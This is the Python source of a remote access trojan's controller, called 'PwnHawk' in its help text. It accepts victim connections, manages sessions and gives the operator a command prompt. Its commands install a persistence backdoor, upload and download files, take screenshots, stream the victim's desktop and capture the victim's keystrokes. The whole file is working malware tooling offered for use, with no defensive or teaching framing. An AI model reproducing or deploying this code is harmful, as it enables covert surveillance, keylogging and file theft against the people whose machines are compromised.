import socket
import json
import os
import random
from string import ascii_letters, digits
from threading import Thread
from termcolor import colored
from tqdm import tqdm
from vidstream import StreamingServer


class Server:
	def __init__(self, LHOST, LPORT):
		self.s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
		self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.__lhost = LHOST
		self.__lport = int(LPORT)
		self.c_sockets = []
		self.c_addrs = []
		self.terminate_ac = False
		self.stream_reciever = StreamingServer(self.__lhost, 8532)
		self.__start_server()


	def __show_help(self):
		_help = f'''
{colored("SYSTEM COMMANDS:", "magenta")}
    	these are all the windows system commands i.e {colored("%s, %s, %s" % ("tracert", "netstat", "ipconfig"), "cyan")} that you can execute.

{colored("CORE COMMANDS:", "magenta")}
	    {colored("help", "cyan")}                     --> show this help on how to use PwnHawk.
	    {colored("sysinfo", "cyan")}                  --> get target system information.
	    {colored("create_persist", "cyan")}           --> create a persistace backdoor if it doesn't exitsts.
	    {colored("quit", "cyan")}                     --> kill the current session.
	    {colored("backgroud", "cyan")}                --> put the current session to the background.

{colored("WORKING WITH FILES:", "magenta")}
	    {colored("dir", "cyan")}                      --> list files in the current working directory.
	    {colored("mkdir", "cyan")} [{colored("dir name","green")}]         --> create a folder on the target system.
	    {colored("cd", "cyan")} [{colored("directory name","green")}]      --> change the current working directory to a specified dir,
	                              directory.
	    {colored("upload", "cyan")} [{colored("file path","green")}]       --> upload the specified filename to the target system.
	    {colored("download", "cyan")} [{colored("filename","green")}]      --> donwload specified filename from the target system.
                                                       
{colored("MISCELLANEOUS:", "magenta")}
	    {colored("screenshot", "cyan")}               --> take a desktop screenshot of the target system.
	    	    
	    {colored("start_screenshare", "cyan")}        --> start desktop screensharing.
	    {colored("stop_screenshare", "cyan")}         --> stop desktop screensharing.
	   
	    {colored("start_keycap", "cyan")}             --> start capturing victim's pressed keystrokes.
	    {colored("dump_keycap", "cyan")}              --> dump/get the captured keystrokes.
	    {colored("stop_keycap", "cyan")}              --> stop the capturing keystrokes.

'''
		print(_help)

	def __start_server(self):
		Thread(target=self.__accept_connections).start()

	def __accept_connections(self):
		SERVER_ADDR = (self.__lhost, self.__lport)
		self.s.bind(SERVER_ADDR)
		self.s.listen()

		self.s.settimeout(1)
		while True:
			if self.terminate_ac:
				self.s.settimeout(None)
				break
			try:
				c_socket, c_addr = self.s.accept()
				self.c_sockets.append(c_socket)
				self.c_addrs.append(c_addr)
			except socket.timeout:
				continue


	def show_connections(self):
		count = 0
		for c_addr in self.c_addrs:
			print(f"session {colored(f'{count}', 'green')} --> {colored(f'{c_addr}', 'green')}")
			count +=1


	def reliable_send(self, target ,data):
		json_data = json.dumps(data)
		target.send(json_data.encode())


	def reliable_recv(self, c_socket):
		data = ""
		while True:
			try:
				data += c_socket.recv(1024).decode().strip()
				return json.loads(data)
			except ValueError:
				continue

		# helper function to download files from the client
	def __download_file(self, c_socket, download_folder, filepath):
		filesize = int(self.reliable_recv(c_socket))
		filename = os.path.basename(filepath)
	    # assigning the path to save the downloaded file
		download_path = f"{download_folder}/{filename}"

	    # checking if the file to be save exists, if it exists
	    # append some random chars to the filename
	    # using the rand_string() function which returns 5 random chars
		if os.path.exists(download_path):
			filename_list = filename.split(".")
			filename = ".".join(filename_list[:-1])
			file_ext = filename_list[-1]
			filename = f"{filename}-{self.__rand_string()}.{file_ext}"
			download_path = f"{download_folder}/{filename}"

		progress = tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
		# recieveing and saving the file
		with open(download_path, "wb") as file:
			c_socket.settimeout(1)
			chunk = c_socket.recv(1024)

			while chunk:
				file.write(chunk)
				progress.update(len(chunk))
				try:
					chunk = c_socket.recv(1024)
				except socket.timeout as e:
					break
			c_socket.settimeout(None)

	# helper function to send files to the client
	def __upload_file(self, c_socket, filepath):
		filesize = os.path.getsize(filepath)
		#c_socket.send(str(filesize).encode())
		progress = tqdm(range(filesize), f"Sending {filepath}", unit="B", unit_scale=True, unit_divisor=1024)
		with open(filepath, "rb") as f:
			while True:
				# read the bytes from the file
				bytes_read = f.read(1024)
				if not bytes_read:
	                # file transmitting is done
					break
	            # we use sendall to assure transimission in
	            # busy networks
				c_socket.sendall(bytes_read)
	            # update the progress bar
				progress.update(len(bytes_read))

	def __screenshot(self, c_socket):
		self.__download_file(c_socket,"screenshots/","monitor-1.png")


	# helper function for generating some randoms chars
	# it returns a random combination of ascii chars and digits only
	def __rand_string(self):
		return "".join(random.SystemRandom().choice(ascii_letters + digits) for _ in range(5))

	def control_clients(self, c_socket, c_addr, s_id):
		exit_shell = False
		hostname, cwd = self.reliable_recv(c_socket).split("|")
		while True:
			if exit_shell:
				break
			cmd = input(f'''
{colored("┌──(", "blue")}{colored(f"pwnlnx💀{hostname}", "red")}{colored(")-[", "blue")}{colored(f"~{cwd}", "white")}{colored("]","blue")}
{colored("└─","blue")}{colored("#", "red")} ''')
			self.reliable_send(c_socket, cmd)
			if cmd == "background":  
				exit_shell = True
			elif cmd == "quit":
				self.c_sockets.pop(s_id)
				self.c_addrs.pop(s_id)
				exit_shell = True
			elif cmd[:2] == "cd" and len(cmd) > 1:
            # returning the cwd if the [directoryname] is None
				if cmd[:2] == "cd" and cmd[3:] == "":
					cwd = self.reliable_recv(c_socket)
	                # if [directoryname] has value then check if the directory exists
	                # if it doesn't exist return a FileNotFoundError else return the cwd
				elif cmd[:2]=="cd" and cmd[3:] !="":
					cmd_result = self.reliable_recv(c_socket)
					if "FolderNotFoundError" in cmd_result:
						print(colored(cmd_result, "red"))
					else:
						cwd = cmd_result

			elif cmd[:14] == "create_persist":
				print(self.reliable_recv(c_socket))			
	        # using the helper upload_file() function to upload file to the target system
	        # if the user provided command is upload
			elif cmd[:6] == "upload":
				self.__upload_file(c_socket, cmd[7:])
	        # using the helper download_file() function to download files from the target system
	        # if the user provided command is download
			elif cmd[:8] == "download":
				self.__download_file(c_socket,"downloads/", cmd[9:])
	        # using the helper screenshot() function to take and dowload screenshots
	        # from the remote system if the user provided command is screenshot
			elif cmd == "screenshot":
				self.__screenshot(c_socket)

			elif cmd == "start_screenshare" or cmd == "stop_screenshare":
				try:
					if cmd == "start_screenshare":
						Thread(target=self.stream_reciever.start_server).start()
					else:
						self.stream_reciever.stop_server()
				except:
					continue
			elif cmd == "clear":
				os.system("clear")
			elif cmd == "start_keycap":
				pass
			elif cmd == "dump_keycap":
				print(self.reliable_recv(c_socket))
				pass
			elif cmd == "stop_keycap":
				pass
	        # getting victim's pc system info
	        # if user provided command is sysinfo
			elif cmd == "sysinfo":
				print("="* 20 , "System Information", "="*20)
				print(self.reliable_recv(c_socket))
				print("="* 20 , "System Information", "="*20)
			elif cmd == "help":
				self.__show_help()
	        # if user doesn't issue any of the commands above, try to execute some
	        # system commands and return either stderr or stdout result
	        # if the command fail to execute or successfully executed respectively
			else:
				print(self.reliable_recv(c_socket))
			
		exit_shell = False
